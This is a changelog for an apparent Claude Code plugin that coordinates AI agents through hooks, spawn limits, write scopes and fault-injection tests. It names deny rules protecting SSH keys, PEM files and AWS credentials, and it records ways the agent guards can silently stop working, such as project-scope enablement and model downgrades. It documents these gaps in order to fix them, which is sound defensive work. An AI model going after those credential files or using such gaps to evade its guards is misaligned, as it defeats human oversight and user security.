# Changelog

Semantic versioning. A change to organizational behaviour carries a migration
note; see [`docs/release.md`](docs/release.md).

## [0.20.0] — Failure identity and execution resolution

### Added — two failures are the same when their identity matches

The loop escalates on a repeat, so the comparison decides between escalating work
that was still making progress and spinning on work that was not. Comparing the
observed text was wrong in both directions:

```
"API returns 401"                }  one failure,
"endpoint still returns 401"     }  read as two

"failed"                         }  two unrelated causes,
"failed"                         }  read as one
```

A failure now carries a `class` and a `signature`. Where none is supplied, one is
derived — and the derivation is deliberately conservative: only identifying tokens
survive (exception names, status codes, test paths, error identifiers), prose is
discarded, and when nothing identifying remains the result **matches nothing,
including another copy of itself**.

That asymmetry is the design. A wrong *"these are the same"* escalates work that
was making progress; a wrong *"these differ"* costs one more attempt inside a
bound that already exists. Only one of those is recoverable by waiting.

### Added — execution mode resolved at runtime, not inherited

A stage declares its mode when the workflow is written, which is before the
situation exists.

```
TASK    DECLARED       RESOLVED       WHY
T-004   team        -> subagent       CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS is not set
T-009   subagent    -> worktree       a sibling holds the database-schema surface
T-010   worktree    -> subagent       code-reviewer holds no write tools
```

Six rules, in order: teams unavailable degrades to subagent; a role with no write
tools is never isolated, because a worktree protects files it could not have
touched; CRITICAL work is never sent to the background, since the point of the
tier is that somebody is watching; two tasks on one coupled surface are isolated
rather than sequenced, so the parallelism survives; a writer alongside running
siblings is isolated; otherwise the declaration stands.

**It resolves and records; it does not compel.** A `PreToolUse` hook can refuse a
spawn but cannot rewrite one. That is in the policy's `not_enforceable` rather
than left to be discovered.

### Both policies are checked, not just written

`check_execution_resolution_is_live()` joins the control-loop equivalent: a
resolution rule with no implementation fails the build. This is the third
subsystem where that check has been added, and it exists because the same defect —
a policy file that reads like the authority and is decoration — has now been found
in this repository four times.

### Two old tests were asserting the old behaviour

`test_the_same_failure_twice_escalates` used a detail with nothing identifying in
it, so under the new rule it correctly stops being a repeat. It now passes an
explicit signature with two *differently worded* reports, which is the case the
change exists for, and a second test covers the opposite direction.

Tests: **346 → 364.**

## [0.19.2] — The scoping field nothing wrote

`change` was declared in the artifact header schema and read by `check_dod.py` for
two releases. Nothing ever wrote it.

So `changes_present()` always returned an empty list, the ambiguity guard
`if len(spanning) > 1` was unreachable, and `--change <id>` filtered every
artifact away. The definition-of-done engine reported all-green on a scoping rule
that was not running — and the ten-scenario simulation was partly measuring
nothing.

### The fix has a natural owner now

A work item **is** a change. `change` is the work item's id, and the two systems
that were built separately are the same thing seen from either end.

- Required on all 27 artifact types produced by a workflow stage. `DEC` is exempt:
  an open decision can outlive the change that raised it, and can be raised with
  no change in flight at all.
- The simulator stamps it per scenario, and **never invents one**. The generic
  required-field filler writes `"simulated <field>"` for anything missing, which
  for an identity would be worse than nothing: every artifact would carry a
  different plausible value and group nothing.
- `check_dod.py` defaults its scope to the project's active work item, so the
  common case needs no flag.

### What that changes in practice

```
scope=(none)           2 artifact(s)  FAIL not approved: SIM-REQ-002
scope=ACME-FEAT-001    1 artifact(s)  PASS all REQ are approved
scope=ACME-FEAT-002    1 artifact(s)  FAIL not approved: SIM-REQ-002
```

Unscoped, a finished change is dragged down by an unrelated one in flight. That
starvation is what the field was for.

And the ambiguity guard fires for the first time:

```
FAIL  cycle_accepted(CYCLE-DEV)
      2 units of work carry a CYCLE-DEV rollup (ACME-FEAT-001, ACME-FEAT-002).
      Re-run with --change to say which one is being evaluated.
```

### Added — the general form of the mistake

`check_required_fields_are_written()` fails the build when a contract declares a
required field that nothing produces. A field with a reader and no writer makes
every predicate reading it vacuous, and nothing else notices because everything
still passes.

`F-25` covers the behaviour: two units of work in one project, the unscoped
evaluation must refuse and name both, the scoped one must pass. Mutation-tested by
removing the stamp.

### The harness caught itself again

Adding the field broke `F-12`, which tests that a dead notification channel does
not stop delivery. It was failing on `required_fields_present` — nothing to do
with notifications. That is precisely the "a refusal for the wrong reason is still
a bug" rule the fault suite was built around, applied to its own runner: each
fault now scopes to its own change.

Tests: **343 → 346.** Faults: **24 → 25.**

## [0.19.1] — Correlation, a real graph, and a gate that blocks

Four defects from a review of 0.19.0. Two were mine and one was a claim I had
made too broadly.

### Fixed — one agent's result was written to every task sharing its role

Attribution was inferred from `role`. With two backend tasks in flight, the agent
finishing one had its output stamped onto both, and the graph then said work was
done that nobody had done. **Role is not an identity.**

Tasks are now leased against the `agent_id` the platform provides at
`SubagentStart` and resolved by the same id at `SubagentStop`. One agent holds one
task; a held task is never offered again; and a result that resolves to no lease
is recorded as unattributed rather than guessed at. Better for a result to belong
to nothing than to the wrong task.

### Fixed — the graph was a pipeline wearing a graph's schema

Every task depended on the one before it, so `runnable()` could only ever return
one task. The coupled-surface exclusion had nothing to exclude and the parallel
execution modes had nothing to run.

Dependencies now come from **artifact flow**: a stage waits for whatever produces
the artifacts its definition of done names. Three things still sequence — a
consumer waits for its producer, everything waits for the human gate ahead of it,
and two stages on the same coupled surface are ordered rather than parallelised.

On a HIGH-risk feature that is five tasks runnable together after architecture,
where it was one.

### Fixed — one global pointer decided what every session was working on

`CURRENT` is project-global. Session A sets it to `FEAT-001`, session B to
`FEAT-002`, and A's next agent is briefed on B's work. Session bindings now take
precedence and live outside source control; `CURRENT` survives as a convenience
for the single-session case and is no longer the runtime identity.

### Added — `TaskCompleted` refuses a completion whose work is not done

Dismissing these hooks entirely was too broad. They carry no dependency data and
offer no `hookSpecificOutput`, so they cannot steer a loop — but an exit-2 veto is
a poor engine and an excellent gate.

This is the one place the definition of done stops being something the
organization evaluates when asked and becomes something that must be true before a
task can close. Narrow on purpose: it blocks on a predicate that **fails**, never
on evidence that is merely unavailable, because "not yet provable" is not "wrong"
and a gate that cannot be satisfied offline is a gate people switch off.

### Added — `policies/platform-capabilities.json`

One checked model of what this plugin believes about Claude Code, and how each
belief was established: `contract`, `empirical`, `documented` or `absent`. A
capability marked load-bearing must name the code that depends on it, and the
validator fails if it names a file that does not exist.

This repository has been wrong about the platform in both directions — emitting a
`permissionDecision` the CLI rejects for ten versions, and documenting `effort` as
unsupported when it is validated. Both were cheap mistakes because each belief
lived in prose, in a different file, with no record of how it was checked.

### Corrected — two claims that were wrong

- `SubagentStart.additionalContext` was called **undocumented**. It is a declared
  field of the hook output schema. The empirical test stays as a regression; the
  wording was wrong.
- **"The graph is generated, not fixed"** oversold it. `docs/work-items.md` now
  carries a maturity table: risk-aware stage selection, artifact-flow
  dependencies, parallelism and bounded replanning are implemented; task synthesis
  beyond the declared stages, fan-out sized to the work, and dependencies inferred
  from the code are **not**.

Tests: **330 → 343.**

## [0.19.0] — Work items, a task graph, and a bounded control loop

The centre of gravity moves from "which stage are we in" to "what is being built,
what has happened, and what happens next when it fails".

### Verified before building, and it changed the design

`TaskCreated` and `TaskCompleted` exist and fire. They carry `task_id` and a
subject, **no dependency information, and no `hookSpecificOutput`** — the only
lever is an exit-2 veto. A control loop built on them could observe and could not
steer, so nothing here uses them.

What does work, confirmed on the wire: **`SubagentStart` returns
`additionalContext` and the subagent receives it.** That is undocumented, and it
is the mechanism the whole design rests on.

### Added — the durable work item

`.ai-engineering/work/<id>/` holds `work-item.yaml`, `graph.yaml` and an
append-only `history.jsonl`, in the project's own source control.

Claude Code has a native task list with real `blocks`/`blockedBy` edges, and this
is deliberately not a second one — `docs/work-items.md` sets out the difference.
The native list is execution state on one machine; this is what the organization
knows, and it survives a machine loss, a clone, and everyone forgetting.

**`intent` and `objective` are separate fields.** What the human said, verbatim,
and what the organization understood. A plan that solves the wrong problem is
invisible when the only record is the restatement — and both reach every agent, so
the agent can notice the gap rather than inherit it.

### Added — a graph that is generated rather than fixed

Built per work item from the workflow's stages, with `optional_when` stages
dropped and the reason recorded.

One judgement worth stating: `optional_when` is prose, and no planner can read
*"the change ships no running service"* out of a sentence of intent. On a LOW or
MEDIUM change, guessing wrong costs a stage nobody needed; on a HIGH or CRITICAL
one it costs the observability design for a service going to production. So the
default **inverts with risk**. Above MEDIUM, optional stages are kept unless the
project lists them as skippable.

Two runnable tasks naming the same coupled surface are never both offered. The
coupling policy gives each surface one owner, and handing both out invites two
agents to redefine the same contract in parallel.

### Added — bounded loops, and a replan that is a first-class operation

| Bound | Default | On exhaustion |
| --- | --- | --- |
| Attempts per task | 3 | escalate |
| Replans per work item | 2 | escalate: two replans means the intake was wrong |
| The same failure twice | — | escalate without spending a third attempt |

That last one is the useful one. A different failure each time is progress; the
same failure twice is not, and retrying it only spends tokens to learn what is
already known.

A replan carries accepted work forward, records its reason, and leaves the
superseded generation in the history. What the organization used to believe is
evidence about how it plans.

### Added — two hooks that make it work at runtime

- `SubagentStart` → `inject_context.py` hands each agent its work item and **its
  own** task. That is what lets agent definitions stay small rather than carrying
  the project's configuration in thirty files that drift apart.
- `SubagentStop` → `observe_subagent.py` records the result against the task and
  says so when an agent stops having produced nothing. A subagent that stops
  silently looks identical to one that succeeded, unless something outside it is
  watching.

### The defect an audit found in this work before it was committed once

`control_loop.py` loaded `control-loop-policy.json` into a variable and then
decided everything with a hardcoded chain. Four of the eight declared rules could
never fire, and the bounds in the policy were not the bounds in force. That is the
`ai.agent_teams_available` shape exactly — a file that reads like the authority
and is decoration.

Fixed: the rules and the bounds are read. And `check_control_loop_policy_is_live()`
now fails the build when a declared rule has no predicate, when a loop declares no
bound, or when the policy names an enforcer that does not exist. The two schemas
had the same problem — written, and validated by nothing. They validate on write
now, which immediately caught a real round-trip bug where YAML returns an ISO
timestamp as a `datetime`.

Tests: **300 → 330.**

## [0.18.1] — The tags never existed

Ten versions shipped with `.claude-plugin/marketplace.json` naming a tag that was
never created. `ref: ai-engineering-os--v0.18.0` pointed at nothing, and every
release before it the same, so a marketplace install would have resolved to a tag
that did not exist.

All ten are now tagged and pushed. Each commit's `plugin.json` already declared
its own version, so the mapping is one-to-one and the retroactive tags are honest
rather than approximate.

The reason nothing caught it: `scripts/check_release.py` compares the ref against
`CI_COMMIT_TAG`, so it only runs **on** a tag and is silent when none was ever
made. `check_marketplace_ref_exists()` now runs on every validation and fails when
the ref names a tag the repository does not have.

A note on the negative test, because it nearly passed for the wrong reason: the
first attempt cloned the repository to test the check, and `git clone` copies only
committed content — so it ran the *old* validator and reported nothing. The check
was fine; the test was wrong. Re-run against the working tree, it fires.

## [0.18.0] — The remaining roadmap, built in parallel

Three agents working simultaneously in disjoint file sets: organizational
evaluations, LSP and worktree isolation, correlation IDs and managed settings.
Each verified its platform claims against the installed CLI before building.

### Added — evaluating the organization, not just the agents

`evaluations/organization-evaluation/`, 10 deterministic cases, 149 checks. The
suite asks whether the *structure* still holds: can a worker bypass its lead, can
QA peer-review its own tests, can a head accept by assertion, can a CRITICAL role
be downgraded, can an agent verdict approve on the organization's behalf.

Twelve mutations, twelve caught — each case proven by breaking the policy it
guards in a throwaway copy and confirming it flips.

**It found a real defect on its first run.** `backend-developer` could write
`k8s/production/api.yaml`, `helm/values-prod.yaml` and `terraform/main.tf`. That
contradicted `policies/coupling-policy.json`, which gives the `deployment-manifest`
surface to `devops-engineer`: *"Application changes request configuration; they do
not write it."* The write scope never enforced it. Now closed for four roles, and
verified in three directions — infrastructure paths deny, `src/`, `tests/` and
`Dockerfile` still allow, and `devops-engineer` still writes them.

### Added — language intelligence as an extension point, and no language server

`.lsp.json` is real and works as documented. Two things the documentation does not
say, both verified against the CLI:

- **`claude plugin validate` does not read `.lsp.json`.** A broken one surfaces
  only at load, as `lsp-config-invalid`. The same object inside `plugin.json`
  `lspServers` *is* validated.
- **`extensionToLanguage` is not variable-expanded** while `command`, `args` and
  `env` are, and an unresolved `${VAR}` is executed verbatim rather than skipped.

So this plugin ships **no `.lsp.json`**. Extension claims are global across plugins
and first registration wins, so a placeholder would outrank a project's real
server, and a variable-driven command would error every session in an unconfigured
project. `docs/lsp.md` documents the companion-plugin route;
`templates/project/lsp.json` is a copyable example, deliberately misnamed so it can
never load.

### Added — worktree isolation as a declared step

`policies/execution-policy.json` said only "do not edit the same file". It now has
an `isolation` block with the integration procedure, an owner, and — the part that
matters — `not_enforceable`. A `PreToolUse` hook can refuse a spawn but cannot
rewrite one, cannot tell whether workers would collide, and does not fire if the
model simply does not spawn. The policy says so rather than implying a guarantee.

### Added — correlation and causation that can actually be walked

`causation_id` alongside `correlation_id`, derived rather than demanded: workflow,
stage and cycle come from the catalogue's `emitted_by`, and causation defaults to
the last event recorded under the same correlation. Nothing existing broke.

`route_event.py --trace` walks one change in causal order; `--verify-chains`
checks every thread and exits non-zero. `tests/test_event_correlation.py` emits a
real 13-event change and reconstructs it **with its own walker**, then asserts a
second interleaved change does not mix in and that timestamp sorting cannot
recover the order — which is what makes the fields load-bearing rather than
decorative.

Documented honestly: the "one thread per feature" chat picture was **not** true
under the default `thread_strategy: subject`, because a defect and its merge
request have different subjects. `correlation` is now a supported strategy; the 53
existing rules were left alone, because how the space should read is a decision to
take rather than a default to flip.

### Fixed — deny rules that matched nothing

The CLI's own validator: *"`Write(...)` is not matched by file permission checks —
only `Edit(path)` rules are."* Three rules in `templates/project/settings.json`
protecting `.ssh/`, `*.pem` and `.aws/credentials` were decoration. Now `Edit(...)`,
which covers every file-editing tool, and `check_permission_rules_are_effective`
fails the build if an inert rule returns.

### Verified — enabling this plugin in project settings can disarm every guard

Under `allowManagedHooksOnly`, a plugin's hooks survive only if that plugin is
enabled in the **managed** `enabledPlugins`. Enabling it at project scope leaves
the guards silently inert. Documented prominently in
`docs/enterprise-deployment.md`, which is rewritten around what each setting does
and does not prevent. Settings deliberately **not** shipped, each with its failure
mode recorded: `forceLoginOrgUUID`, `forceRemoteSettingsRefresh`,
`allowManagedPermissionRulesOnly`, `availableModels`, `disableAllHooks`.

### A claim I checked and rejected

An agent reported that `{"source": "url", "url": "….git"}` in `marketplace.json`
never resolves and needs `"source": "git"`. It flagged the claim as unverified, and
it was wrong: `claude plugin validate` **rejects** `source: "git"` for a plugin
entry and **accepts** `url` with a `.git` URL and a `ref`. The marketplace-source
union and the plugin-source union are not the same. No change made.

Tests: **256 → 300.** Evaluations: **35 → 45 deterministic.**

## [0.17.0] — Environment promotion

A release used to say "tests pass". It now says where.

### Added — a declared ladder, and a record per rung

`deployment.environments` in the project's own configuration, ordered and ending
at production, because a library has no ladder and a regulated platform has five.
Each rung declares what it `proves` and — the field worth arguing over —
`differs_from_next`.

```yaml
- name: staging
  proves: End-to-end behaviour against partner-shaped data and real credentials.
  differs_from_next: Roughly a tenth of production volume, one partner instead of
    forty, and no sustained concurrent load. Says nothing about behaviour at peak.
```

**"It worked in staging" is only evidence to the extent staging resembles
production.** Writing the difference down is what stops an environment being
treated as proof of something it never tested.

### Added — `PROM`, immutable

One record per rung, carrying that environment's own evidence rather than the
release carrying one undifferentiated claim. `what_this_does_not_prove` is copied
from the ladder **at the moment of promotion**, which is deliberate duplication:
the ladder can be edited later and the record of what was believed at the time
should not move with it.

Immutable for the same reason, with `may_modify` empty — the validator refused the
first version, which declared it immutable and then listed roles that could edit
it. A promotion is amended by promoting again, not by revising what was recorded
last time.

### Added — `promoted_through(environment)`

In `DEPLOY` for both deploying workflows. It reads the project's ladder, so it
adapts rather than assuming five environments, and it fails by **naming the rung
that has no record**:

```
FAIL  promoted_through(production)
      no promotion record for staging. The ladder is dev -> staging -> production
      and it cannot be skipped.
```

A release that reached production with no staging record did not skip a test; it
skipped the evidence that the test happened, and from the outside those are
indistinguishable.

`F-24` skips a rung and must be refused, and must name which one. Mutation-tested.

Faults: **23 → 24.** DoD predicates: **354 → 357.**

## [0.16.0] — SLOs and observability design

### Added — `SLO` and `OBS`, deliberately two artifacts

`OBSERVABILITY` runs after architecture and **before development**, because
instrumentation added after an incident is instrumentation designed from memory.

It produces two artifacts rather than one, and the separation is the whole point:
an objective and the ability to measure it fail independently.

| | Says | Fails by |
| --- | --- | --- |
| `SLO` | What is promised, and how it is computed | Being a number nobody can breach |
| `OBS` | What the system can be seen doing | Being a dashboard nobody asked for |

`every_linked(SLO, OBS)` catches promising 99.9% with no metric behind it.
`every_linked(NFR, SLO)` catches the other direction: a quantified target that
never became a commitment anyone could breach. Both are new faults, both
mutation-tested.

`SLO` keeps `sli` and `measured_from` separate because "availability" is not a
measurement until something says where the number comes from. `breach_consequence`
is required because an objective nothing happens about is a wish; `"none"` is a
legitimate answer that at least stops it being quoted as a commitment later.

The field that earns its place in `OBS` is `gaps`. Naming what **cannot** be seen
is worth more than listing what can, and it is what stops the answer after
production being "there is no metric for this". The shipped simulation ships a
feature with a real one: nothing distinguishes a partner-side refusal from our own
timeout.

The stage is `optional_when` the change ships no running service, or is entirely
covered by an existing objective — and the second case must name **which** one, so
it is a decision rather than an omission.

### Changed — SRE now spans the whole change

`CYCLE-SRE` opened at `VERIFY` two releases ago, then at `READINESS`, and now at
`OBSERVABILITY`. The department that has to operate the system is involved from
the design onward rather than arriving to find out what was built.

`READINESS` gained `every_linked(SLO, OBS)` and its `PRR` now points at the real
observability artifacts instead of describing them in prose.

Faults: **21 → 23.** DoD predicates: **346 → 354.**

## [0.15.0] — Production readiness and runbooks

### Added — `PRR`, and a `READINESS` stage that decides nothing

Before this, the AP-01 release approver approved "the release" with no single
sheet of evidence to read. `READINESS` runs after QA in `WF-FEATURE` and after
staging in `WF-RELEASE`, and collects what each dimension already produced:
architecture, security, testing, performance, observability, runbook, backup and
restore, rollback, capacity.

It **adds no human gate**. What it changes is what the existing one reads:
`RELEASE` now requires `artifact_status(PRR, ready)` and a link to it. A readiness
review that re-litigated architecture would be a second architecture review, which
is how a gate becomes theatre, so each field points at existing evidence or states
an exemption and its reason. An empty field and a deliberate exemption look
identical later, so both are written down.

The field carrying the most weight is `unmet`. A readiness record listing nothing
outstanding is either true or unread, and the approver is entitled to know which.
`not-ready` is a legitimate outcome, not a failed review.

### Added — `RUN`, written for 3am

Symptoms come first, because the person reading it knows what they are seeing and
not what it is called. Remediation steps needing approval say so inline, so nobody
discovers a gate halfway through an outage.

It carries **no approval**, and the validator was what insisted: `reliability-reviewer`
records a verdict, and this repository's own principle is that a verdict is not an
approval. A runbook needing sign-off before anyone may follow it is a runbook
nobody reads during an outage.

`last_exercised` exists because a runbook nobody has followed is a document rather
than a procedure. An incident is the only time one is genuinely tested, so
`WF-INCIDENT/RCA` now records whether a runbook existed, whether it was followed,
and where it was wrong, and updates `last_exercised` on any that were used. That
turns "never exercised" from a fact nobody tracks into one the readiness record
lists as unmet — which is exactly what the shipped simulation does, raising a
`DEBT` item for it at `OPS`.

### Changed — SRE engages before production, not after it

`CYCLE-SRE` was entered at `VERIFY`, which is after deployment. It is now entered
at `READINESS` and continued at `VERIFY`, so the department that operates the
system is involved before it has to.

### Two new faults

`F-20` seeks a release with readiness `not-ready`. `F-21` declares readiness with
no runbook. Both mutation-tested.

Faults: **19 → 21.** DoD predicates: **334 → 346.**

## [0.14.0] — Change request and data migration

Two workflows for changes the existing set handled badly: altering a commitment
already made, and transforming data that already exists.

### Added — `WF-CHANGE`

"Increase retention from 30 days to 90" is one sentence that touches
requirements, architecture, capacity, cost, security, compliance, testing and
release. The work is the impact assessment; the implementation that follows is
ordinary delivery.

`RAISE → ASSESS → DECIDE → PROPAGATE`

What separates it from `WF-FEATURE` is that the system already does the thing, so
the `CR` artifact must point at the **current commitment** it alters. Without that
baseline the assessment has nothing to measure against, and "increase retention to
90 days" cannot be told apart from "we already do that".

`ASSESS` must answer every dimension the project declares. `"none, because..."` is
an answer; silence is not, and a dimension with no owner opens a `DEC` rather than
being recorded as unaffected — recording it as unaffected is how a change request
becomes an incident later.

New approval `AP-15`. Distinct from `AP-03`: selecting a technology is a different
decision from changing a target the current technology already meets.

Rejecting a change request is a normal outcome and is **not** cancellation. A
rejected `CR` reached `DECIDE` and got an answer; a cancelled one was abandoned
before anyone decided.

### Added — `WF-MIGRATION`

Code can be rolled back. Data written in a new format usually cannot. That
asymmetry is why more of this workflow happens before production than after.

```
IMPACT → DESIGN → SAFETY → REHEARSE → AUTHORIZE → EXECUTE → VERIFY → CLOSE
                                                       ↓
                                                   ROLLBACK
```

Three stages exist to make a claim testable rather than aspirational:

- **`SAFETY`** restores a backup somewhere and checks its contents. A backup nobody
  has restored is a hope, and the restore's duration is the real recovery time.
- **`REHEARSE`** runs the migration against restored production-shaped data and
  then runs the rollback. Row counts are compared against the `IMPACT` prediction,
  and a mismatch is a defect in the query rather than in the prediction. It is the
  one team stage: QA, performance and SRE need to watch the *same* run, because
  sequentially each sees a different one and none sees the interaction.
- **`CLOSE`** records that the rollback path is now shut, and from when. A
  compatibility window nobody closes stays open in everyone's head while the code
  supporting it rots.

The `MIG` artifact keeps `rollback_procedure` and `rollback_tested` separate,
because a written rollback that has never been run is a hope too.
`irreversible_after` names the point past which rollback stops being possible; a
migration whose answer is "immediately" needs a different design, not a braver
deployment.

### A bug the validators caught in the new workflow

`EXECUTE` entered `CYCLE-DEVOPS` and `ROLLBACK` completed it, so the happy path
opened the deployment cycle and never closed it — the cycle was only ever
completed by the migration going wrong. `EXECUTE` now completes it, and `ROLLBACK`
is an exceptional path taken by the same people rather than a second cycle.

### Added — 13 events, 3 scenarios, 2 faults

`CHANGE_*` and `MIGRATION_*` events with routing. `MIGRATION_ROLLED_BACK` is
classified **incident** level rather than organization, because reverting data in
production is an incident whatever the reason for it.

Three new simulation scenarios: the change request, the migration, and the
migration that has to be rolled back. The happy path proves the migration can run;
the rollback scenario proves the organization can undo it, which is the property
the whole workflow is arranged around.

`F-18` reaches authorization with `rollback_tested` empty and must be refused.
`F-19` decides a change request with a blocking decision still open. Both
mutation-tested.

Tests: 256. Faults: **17 → 19.** Scenarios: **7 → 10.** DoD predicates: **264 → 334.**

## [0.13.0] — Liveness and limits

Two questions the state machines could not answer about themselves: what happens
when nothing happens, and how much may one role run at once.

### Added — time-based liveness

Every state machine says what may happen next. None said how long the wait may be,
so a workflow could be perfectly correct and stall forever. **Correctness does not
imply progress.**

`policies/sla-policy.json` sets how long an item may sit in one state before
someone is told, and who. `scripts/check_liveness.py` reports it and exits 1 when
something is stale, so a caller can act.

The ladder is `lead → head → human_owner`, and the most severe threshold an item
has passed wins, so a review stuck 27 hours goes to the head rather than producing
two notifications. A `DEC` marked blocking runs on **half** every threshold: an
ordinary open question can wait, one with work stopped behind it cannot.

Two new events, `WORK_STALE` and `DECISION_STALE`. Staleness is a pattern rather
than an incident, so `WORK_STALE` aggregates into a digest; an unanswered decision
blocks work and only a human can clear it, so `DECISION_STALE` is told immediately.

**It is not a scheduler, and does not pretend to be.** Claude Code has no
persistent background process this plugin can rely on, so nothing fires by itself:
it answers when run, from a session, from CI, or from whatever timer the project
already has. `policies/sla-policy.json` states this in its own text rather than
leaving it to be discovered.

False positives are the real risk here — a report that fires on healthy work is one
people learn to ignore. Accepted work, resolved decisions and anything that moved
recently stay silent, and the tests spend as many cases proving that as proving
detection.

### Added — concurrency limits, mechanically enforced

Spawn authority answered whether a role may delegate and never how much.
`engineering-director` may spawn thirteen kinds of agent, and nothing stopped it
spawning thirteen for a one-line change — each one a full Claude session.

| Role | Concurrent |
| --- | --- |
| `engineering-director` | 6 |
| `incident-commander`, `development-lead` | 4 |
| `qa-lead` | 3 |
| `product-manager`, `security-architect`, any other role | 2 |
| **whole session** | **10** |

`guard_spawn.py` enforces it and **escalates rather than denies**: a wide fan-out
is sometimes right, and the person running the session is the one who can tell.
What must not happen is that sixteen sessions get spawned without anyone choosing
it. Being under the limit never makes a forbidden spawn allowed — the check runs
only after `may_spawn` has already permitted the edge.

The count is measured, not declared. `hooks/lib/ledger.py` records each allowed
spawn; the `SubagentStop` hook clears it. Entries **expire** after 30 minutes,
because the hook cannot reliably correlate a subagent's end with its start and a
ledger that only cleared on an explicit close would leak slots until a role could
never delegate again. An expiring entry can undercount; a leaking one eventually
blocks everything. For a guardrail against runaway fan-out, undercounting is the
safer failure — and a broken ledger never blocks delegation at all.

Not seen, and stated in the policy: teammate spawns Claude Code performs outside
the `Agent` tool, other sessions, and a subagent that ends with no stop signal
until its entry expires.

A spawn carrying **no** session id is not counted at all. The existing hierarchy
tests found this on the first full run: with no session there is no boundary to
count within, every caller shares one ledger, and unrelated work contends for the
same slots until it blocks. A limit that cannot be scoped correctly is not
applied.

### Two new faults

`F-16` stalls a review for three days and requires it to be reported. `F-17` fans
a role past its cap and requires the spawn to escalate. Both mutation-tested:
disable the control and the fault starts failing.

Tests: **236 → 256.** Faults: **15 → 17.**

## [0.12.0] — Fault injection

The simulation showed the process can complete. This shows it stops when it
should — and, where the failure is a degradation rather than a fault, that it
carries on.

### Added — `scripts/inject_faults.py`

Fifteen faults across five classes, each asserting a specific outcome rather than
"something failed":

- **Loop-backs**: architecture rejected, QA failing, production verification failing
- **Gates**: scope never accepted, a high finding with no exception, release unapproved
- **The department cycle**: rework limit exceeded and reached, an open escalation,
  an item withdrawn rather than finished
- **Degradations that must NOT stop delivery**: agent teams unavailable, chat
  unreachable, GitLab unreachable
- **The controls' own failure**: a corrupt hook policy, a model the organization
  does not permit

Two rules shape every case.

**A refusal for the wrong reason is still a bug.** Each fault names the predicate
that must be the one to object. The harness caught this in its own first draft:
F-12 "passed" because three cycle predicates failed over a missing rollup, which
had nothing to do with notifications. It would have kept passing after the control
it claimed to test was deleted.

**Degradation is not failure.** A chat webhook being down must leave delivery
running, and three cases assert exactly that.

### Added — the fault suite is itself tested

`tests/test_fault_injection.py` removes a control and requires the matching fault
to start failing. Verified against five mutations, all caught:

| Control removed | Result |
| --- | --- |
| The AP-12 predicate deleted from REQ | caught |
| The rework limit stops being enforced | caught |
| Withdrawing an item counts as accepting it | caught |
| An unavailable model downgrades instead of blocking | caught |
| The guard falls silent when its policy is corrupt | caught |

A fault suite that still passes against a broken system is worse than none,
because it certifies the damage.

Fault injection now runs in `check_all.sh` and in CI as its own job. It takes
about ten seconds.

Tests: **233 → 236.**

## [0.11.0] — Platform review P0s

A repository-level review against Claude Code as of 20 August 2026. Seven items
were raised as blocking an enterprise pilot. Six were real. One was not, and
checking it found a mistake of my own going the other way.

### Fixed — an unavailable model silently downgraded critical work

An organization's `availableModels` allowlist can exclude the model a risk floor
requires. Claude Code then runs on something weaker while `resolve_model.py` kept
reporting the model it wanted, so the floor read as satisfied while the work ran
below it.

HIGH and CRITICAL work now **blocks**. `resolve_model.py` exits `3`, because a
caller that reads `opus` off stdout and proceeds is exactly the failure this
prevents. LOW and MEDIUM work falls back to the best available model and says so.
Projects declare `ai.available_models`; empty means unrestricted.

### Fixed — three keys that looked like configuration and were none

Claude Code warns and discards `permissionMode`, `hooks` and `mcpServers` on a
plugin agent. The frontmatter allowlist permitted all three. It now rejects them,
so the repository cannot carry a control that does nothing.

### Corrected — I was wrong about `effort` in 0.10.0

0.10.0 documented that `effort` was skill and command frontmatter and would be
"read by nothing" on an agent. That is false. Claude Code validates `effort` on
plugin agent files against `low`, `medium`, `high`, `xhigh`, `max` or an integer.
It is now set on all 30 agents from `policies/model-policy.json`, and a test
fails if a body and the policy disagree.

### Rejected — "plugin subagents ignore the `skills` frontmatter"

Raised as a P0. It does not hold. The CLI's warning covers exactly three fields —
`permissionMode`, `hooks`, `mcpServers` — and `skills` is not among them. An
earlier review had already confirmed empirically that a plugin agent quotes its
preloaded skill content verbatim. No change; the mechanism works as documented.

### Fixed — the hook description contradicted the hooks

`hooks.json` still announced "Every guard fails open with a loud message", which
has been untrue since failure became risk-tiered. Catastrophic and high-risk
actions are denied when a guard cannot complete; only advisory guards fail open.

### Fixed — CI could not be trusted as a release gate

- **A duplicated `rules:` key.** YAML keeps the last, so the earlier block never
  applied. Silent in every loader, which is why `check_ci_config` now looks for it.
- **`claude-plugin-validate` allowed failure unconditionally.** A release could
  ship a plugin Claude Code's own validator rejects. It stays tolerant on a branch,
  where a runner may genuinely lack the CLI, and is mandatory on the default branch
  and on tags.
- `strict-structure` is likewise mandatory on a tag, which is what makes the
  placeholder marketplace URL a release blocker rather than a warning.

### Fixed — version and count drift

`plugin.json` said `0.9.0`, the README said `0.7.0` and "29 agents". Both are now
checked: a version or agent-set claim in prose that disagrees with the manifest is
a CI error, not a reading exercise.

Tests: **226 → 233.**

## [0.10.0] — Closing the review findings

Everything the three 0.9.0 reviews raised, verified before it was acted on. Two
findings did not survive checking and are recorded below as rejected.

### Fixed — predicates answered the wrong question

`cycle_accepted(CYCLE-DEV)` matched **every** artifact in the project. A finished
run vacuously satisfied a new one, and two features in flight starved each other:
one feature's `IN_PROGRESS` rollup failed the predicate for every other feature.

Artifact headers now carry `change`, the unit of work they belong to, and
`check_dod.py --change` scopes evaluation to it. An unscoped run that spans two
units of work **refuses to answer** rather than mixing them — silently resolving
the ambiguity is what let a stale rollup satisfy a new feature.

### Fixed — three predicates their own stage could not satisfy

- **`every_linked(RCA, DEF)`** demanded a defect, while the stage that must satisfy
  it lists monitoring, automation and process improvements as valid outcomes. An
  incident whose corrective actions were all monitoring changes could only pass by
  inventing a defect. Replaced with `corrective_actions_tracked(RCA)`, which accepts
  a defect, debt item, requirement or architecture decision.
- **`no_unresolved_findings(high)`** could never pass, so `CYCLE-SEC`'s
  `exception_granted` edge — the path a human takes to accept a standing risk under
  AP-04 — led nowhere. A recorded AP-04 exception now resolves the finding. Without
  one it still blocks.
- **A recorded escalation blocked closure forever.** The list was read as open in
  its entirety, so using the mechanism the design tells you to use permanently
  barred the macro stage. Escalations may now carry `resolved_at`.

### Fixed — no way to end a change that is dropped

Workflows had only a success exit. Every workflow now declares `cancellation`:
the terminal status, who decides, and what closing requires — including that every
department cycle the change entered reaches a terminal state. A cycle left open is
work the organization still believes is running.

### Added — the lifecycle is now enforced in one place

`Stop` and `SubagentStop` hooks run `check_artifacts.py`, which refuses to end a
session that leaves a malformed artifact behind. It was chosen as the one part of
the contract that needs **no session state**: the audit log already records what
